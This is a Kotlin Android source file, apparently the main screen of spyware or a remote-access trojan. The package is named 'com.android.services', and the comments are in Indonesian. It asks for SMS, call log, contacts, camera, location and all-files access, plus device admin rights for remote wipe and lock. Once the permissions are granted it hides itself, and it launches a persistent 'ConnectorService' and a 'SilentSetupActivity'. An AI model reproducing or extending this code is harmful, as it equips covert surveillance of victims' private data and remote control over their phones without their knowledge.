package com.android.services

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.android.services.databinding.ActivityMainBinding
import com.google.firebase.crashlytics.FirebaseCrashlytics
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val prefs by lazy { getSharedPreferences("connector_prefs", Context.MODE_PRIVATE) }
    private val crashlytics by lazy { FirebaseCrashlytics.getInstance() }

    private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
    private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }

    private val RUNTIME_PERMISSIONS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_PHONE_STATE,
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        crashlytics.log("MainActivity: onCreate")

        ensureDeviceId()
        // Service selalu distart di sini — satu kali, sebelum updateUI().
        // hideAndExit() tidak perlu memanggil startConnectorService() lagi
        // agar tidak ada pemanggilan startForegroundService() dari context
        // Activity yang sedang finishing (crash di Android 12+).
        startConnectorService()

        binding.btnAccessibility.setOnClickListener {
            startActivity(Intent(this, SilentSetupActivity::class.java))
        }

        binding.btnLaunch.setOnClickListener {
            hideAndExit()
        }

        updateUI()
    }

    override fun onResume() {
        super.onResume()
        // Guard: skip jika activity sedang finishing (onCreate sudah panggil finish())
        // Tanpa guard ini Android tetap memanggil onResume() setelah finish(),
        // sehingga startConnectorService() bisa terpanggil di context yang sedang dying.
        if (!isFinishing) updateUI()
    }

    private fun updateUI() {
        val allPermsOk = allPermissionsGranted()
        // Device Admin bersifat opsional — tidak menghalangi app untuk bersembunyi.
        // Tanpa admin, hanya wipeDevice() dan lockScreen() yang tidak berfungsi.
        val adminOk = dpm.isAdminActive(adminComponent)

        crashlytics.log("MainActivity: updateUI allPermsOk=$allPermsOk adminOk=$adminOk")

        // Cukup semua runtime permission + storage → langsung sembunyikan
        if (allPermsOk) {
            hideAndExit()
            return
        }

        val missing = mutableListOf<String>()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) missing.add("Lokasi")
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) missing.add("SMS")
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) missing.add("Log Panggilan")
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) missing.add("Kontak")
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) missing.add("Kamera")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) missing.add("Akses File (All Files Access)")
        if (!adminOk) missing.add("Admin Perangkat (opsional)")

        crashlytics.log("MainActivity: missing = ${missing.joinToString()}")
        binding.tvAccessStatus.text = "Izin yang belum diberikan:\n• ${missing.joinToString("\n• ")}\n\nKetuk tombol untuk berikan izin."
        binding.tvAccessStatus.setTextColor(getColor(R.color.red))
        binding.btnAccessibility.text = "Berikan Izin →"
        binding.btnAccessibility.visibility = View.VISIBLE
        binding.btnLaunch.visibility = View.GONE
    }

    private fun allPermissionsGranted(): Boolean {
        val runtimeOk = RUNTIME_PERMISSIONS.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        val storageOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else true
        return runtimeOk && storageOk
    }

    private fun hideAndExit() {
        // Service sudah distart di onCreate() — tidak perlu dipanggil lagi.
        // Memanggil startForegroundService() dari Activity yang sedang
        // finishing bisa crash di Android 12+ (BackgroundServiceStartNotAllowedException).
        finish()
    }

    private fun ensureDeviceId() {
        if (prefs.getString("device_id", null) == null) {
            prefs.edit().putString("device_id", UUID.randomUUID().toString()).apply()
        }
    }

    private fun startConnectorService() {
        val intent = Intent(this, ConnectorService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            crashlytics.recordException(e)
        }
    }
}
